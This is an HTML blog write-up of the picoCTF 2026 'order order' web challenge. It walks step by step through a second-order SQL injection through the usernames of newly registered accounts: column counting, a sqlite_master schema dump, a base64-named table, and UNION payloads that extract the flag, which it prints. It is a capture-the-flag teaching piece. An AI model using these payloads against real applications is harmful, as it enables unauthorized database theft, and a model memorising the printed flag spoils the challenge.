@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>picoCTF 2026: order order | Web Exploitation Writeup by gr4ktung</title>
+    <meta name="description" content="Technical walkthrough of the order order challenge. Exploiting Second-Order SQL Injection to dump SQLite databases and extract the flag.">
+    <link rel="stylesheet" href="../../../style.css">
+</head>
+<body>
+    <div class="cyber-grid"></div>
+
+    <nav>
+        <div class="logo"><a href="../../../index.html">gr4ktung</a></div>
+        
+        <div class="search-container">
+            <span class="search-prompt">gr4ktung@blog:~$ grep</span>
+            <input type="text" id="site-search" placeholder="..." autocomplete="off">
+        </div>
+
+        <div class="nav-links">
+            <a href="../../../about.html">~/about</a>
+            <a href="../../../blog.html" class="active">~/posts</a>
+            <a href="../../../achievements.html">~/achievements</a>
+        </div>
+    </nav>
+
+    <main>
+        <div class="writeup-layout">
+            
+            <aside class="sidebar">
+                <h4>MISSION_BRIEF</h4>
+                <div class="intel-grid">
+                    <div class="detail-box">
+                        <span class="label">Target</span>
+                        <span class="value">order order</span>
+                    </div>
+                    <div class="detail-box">
+                        <span class="label">Category</span>
+                        <span class="value">Web Exploit</span>
+                    </div>
+                    <div class="detail-box">
+                        <span class="label">Event</span>
+                        <span class="value">picoCTF 2026</span>
+                    </div>
+                    <div class="detail-box">
+                        <span class="label">Difficulty</span>
+                        <span class="value" style="color: #ffb83e;">Medium</span>
+                    </div>
+                </div>
+                
+                <div style="margin-top: 20px;">
+                    <span class="tag">SQLi</span>
+                    <span class="tag">Second-Order</span>
+                    <span class="tag">SQLite</span>
+                    <span class="tag">Data Dump</span>
+                </div>
+            </aside>
+
+            <article class="blog-content" style="min-width: 0;">
+                <h1>Challenge Writeup: order order</h1>
+                <div class="blog-meta">
+                    > Published: March 22, 2026 | ⏱ 6 min read | Author: gr4ktung
+                </div>
+
+                <div class="card" style="border-left: 3px solid #00ff41; background: rgba(0, 255, 65, 0.05); margin-bottom: 30px;">
+                    <p style="margin: 0; line-height: 1.6;">
+                        <span style="color: #00ff41; font-weight: bold;">[!] INTEL_UPDATE:</span><br>
+                        Hello guys! I participated in this CTF with the <span style="color: #00ff41;"><strong>t3rm1n4t0rs</strong></span> team. We managed to secure <span style="color: #00ff41;"><strong>177th place out of 8747</strong></span> teams in the <strong>PicoCTF 2026 Global Competition Scoreboard</strong>! 
+                        <br><br>
+                        A huge shoutout to <a href="https://kanyokoo.github.io/portfolio/" target="_blank" style="color: #00ff41; text-decoration: underline;">Reuben Kanyoko</a> from <strong><a href=" https://www.youtube.com/@cybersensei-EH" target="_blank" style="color: #00ff41; text-decoration: underline;">CyberSensei</a></strong>.
+                    </p>
+                </div>
+               
+
+                <h3>📖 Description</h3>
+                <p>Can you try to get the flag from our website? I've prepared my queries everywhere! I think!</p>
+
+                <img src="../../picoctf/images/orderpic.png" alt="Challenge Interface" class="content-img">
+
+                <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
+
+                <h3>Step 1: Initial Access & Registration</h3>
+                <p>I started by visiting the web application and was presented with a welcome page.</p>
+                <img src="../../picoctf/images/order01.png" alt="Challenge Interface" class="content-img">
+                <p>I created an account with basic credentials to gain internal access:</p>
+                <ul>
+                    <li><strong>Username:</strong> <code>test</code></li>
+                    <li><strong>Email:</strong> <code>test@test.com</code></li>
+                    <li><strong>Password:</strong> <code>test1234</code></li>
+                </ul>
+                <p>After registering, I was successfully logged into the dashboard.</p>
+
+                <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
+
+                <h3>Step 2: Dashboard & Features Recon</h3>
+                <p>The application allows tracking and managing expenses via three main sections: Dashboard, Expenses, and Inbox. Navigating to the Expenses page, I added a dummy entry to test the functionality:</p>
+                
+                <div class="command-block">Description: Testing the expense
+Amount: 1000
+Date: 2026-03-22</div>
+
+                    <img src="../../picoctf/images/order02.png" alt="Challenge Interface" class="content-img">
+
+                <p>Clicking <strong>Generate Report</strong> yielded the message: <em>"Report generation requested successfully! Check your inbox after 10 seconds!!!"</em>.</p>
+                    
+                <img src="../../picoctf/images/order03.png" alt="Challenge Interface" class="content-img">
+                <p>I navigated to the Inbox and downloaded the generated CSV:</p>
+
+                <img src="../../picoctf/images/order04.png" alt="Challenge Interface" class="content-img">
+
+                <div class="command-block">cat report_test_1774205477.csv
+
+description,amount,date
+Testing the expense,1000.0,2026-03-22</div>
+                    <img src="../../picoctf/images/order05.png" alt="Challenge Interface" class="content-img">
+
+                <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
+
+                <h3>Step 3: Identifying the Vulnerability</h3>
+                <p>At this point, nothing seemed exploitable directly in the expense fields. I tested input handling by registering a new username containing a quote: <code>test'</code>.</p>
+
+                <img src="../../picoctf/images/order06.png" alt="Challenge Interface" class="content-img">
+                <p>After adding an expense and generating a report with this new user, checking the inbox revealed a fatal error:</p>
+
+                <div class="command-block">🚨 Report generation failed. Cause unrecognized token: "'test''"</div>
+
+                <img src="../../picoctf/images/order07.png" alt="Challenge Interface" class="content-img">
+
+                <p>Downloading the report file resulted in an <strong>Internal Server Error</strong>. </p>
+
+                <img src="../../picoctf/images/order08.png" alt="Challenge Interface" class="content-img">
+                <p>This strongly indicated a <strong>Second-Order SQL Injection</strong> vulnerability. The username is being directly injected into an SQL query without sanitization during report generation:</p>
+
+                
+                <div class="command-block">SELECT description, amount, date 
+FROM expenses 
+WHERE username = '[USERNAME]'</div>
+
+                <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
+
+                <h3>Step 4: Finding Column Count</h3>
+                <p>To perform a UNION-based SQL injection, I needed the correct number of columns. I registered a new users with the payloads: <code>' UNION SELECT 1,2,3,4 -- , ' UNION SELECT 1,2 --</code>, which failed.</p>
+                
+                <img src="../../picoctf/images/order11.png" alt="Challenge Interface" class="content-img">
+                <p> However, a 3-column payload succeeded:</p>
+
+                <img src="../../picoctf/images/order09.png" alt="Challenge Interface" class="content-img">
+
+                <div class="command-block"># Register with Username:
+' UNION SELECT 1,2,3 --
+
+# Output of downloaded CSV:
+cat "report_' UNION SELECT 1,2,3 --_1774207021.csv"
+
+description,amount,date
+1,2,3</div>
+                    <img src="../../picoctf/images/order10.png" alt="Challenge Interface" class="content-img">
+                <p>✅ <strong>Column count = 3</strong></p>
+
+                <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
+
+                <h3>Step 5: Enumerating Database Schema</h3>
+                <p>I dumped the database schema using SQLite’s internal table with the following payload as the username:</p>
+
+                <div class="command-block">' UNION SELECT name, sql, 'x' FROM sqlite_master --</div>
+
+                <p>The downloaded CSV revealed several tables: <code>users</code>, <code>expenses</code>, <code>reports</code>, <code>inbox</code>, and suspiciously, <code>aDNyM19uMF9mMTRn</code>.</p>
+
+                <img src="../../picoctf/images/order12.png" alt="Challenge Interface" class="content-img">
+
+                <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
+
+                <h3>Step 6: Identifying the Target Table</h3>
+                <p>The table name <code>aDNyM19uMF9mMTRn</code> looked base64 encoded. Let's decode it:</p>
+
+                <div class="command-block">echo "aDNyM19uMF9mMTRn" | base64 -d
+# Output: h3r3_n0_f14g</div>
+
+                    <img src="../../picoctf/images/order13.png" alt="Challenge Interface" class="content-img">
+
+                <p>Despite the classic CTF misdirection ("here no flag"), the schema definition confirmed it was our target:</p>
+
+                <div class="command-block">CREATE TABLE aDNyM19uMF9mMTRn (
+    name TEXT PRIMARY KEY,
+    value TEXT NOT NULL
+)</div>
+
+                <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
+
+                <h3>Step 7: Extracting Table Data (Flag)</h3>
+                <p>I created one final user with the payload to extract the <code>name</code> and <code>value</code> columns from the target table:</p>
+
+                <div class="command-block">' UNION SELECT name, value, 'x' FROM aDNyM19uMF9mMTRn --</div>
+
+                <img src="../../picoctf/images/order14.png" alt="Challenge Interface" class="content-img">
+
+                <p>Downloading the final report CSV dumped the contents of the table, granting us the flag:</p>
+
+                <div class="command-block" style="overflow-x: auto; word-break: break-all;">cat "report_' UNION SELECT name, value, 'x' FROM aDNyM19uMF9mMTRn --_1774208568.csv"
+
+description,amount,date
+flag,picoCTF{s3c0nd_0rd3r_1t_1s_28c0f73b},x</div>
+
+                    <img src="../../picoctf/images/order15.png" alt="Challenge Interface" class="content-img">
+
+                <div style="text-align: center; margin-top: 40px;">
+                    <div class="flag-block">picoCTF{s3c0nd_0rd3r_1t_1s_28c0f73b}</div>
+                </div>
+
+                <p style="color: #888; font-size: 0.85rem; text-align: center;">
+                    <em>P.S: Do not copy paste the flag; the last part of the flag is unique for every user.</em>
+                </p>
+
+                <div class="post-nav">
+                    <a href="../../../blog.html" class="btn">RETURN_TO_DIR</a>
+                </div>
+            </article>
+
+            <!--
+                <aside class="sidebar" style="background: transparent; border: none; padding: 0;">
+                    <h4 style="padding-left: 20px;">RELATED_INTEL</h4>
+                    <div class="staggered-links">
+                        <a href="../picoctf/n0s4n1ty.html" class="stagger-link">Web: n0s4n1ty (picoCTF)</a>
+                    </div>
+                </aside>
+            -->
+        </div>
+    </main>
+
+    <footer>
+        <p>sys.exit(0) | Designed by gr4ktung </p>
+    </footer>
+
+    <div class="scroll-controls">
+        <button class="scroll-btn" id="scroll-to-top">↑</button>
+        <button class="scroll-btn" id="scroll-to-bottom">↓</button>
+    </div>
+
+    <script src="../../../script.js"></script>
+</body>
+</html>
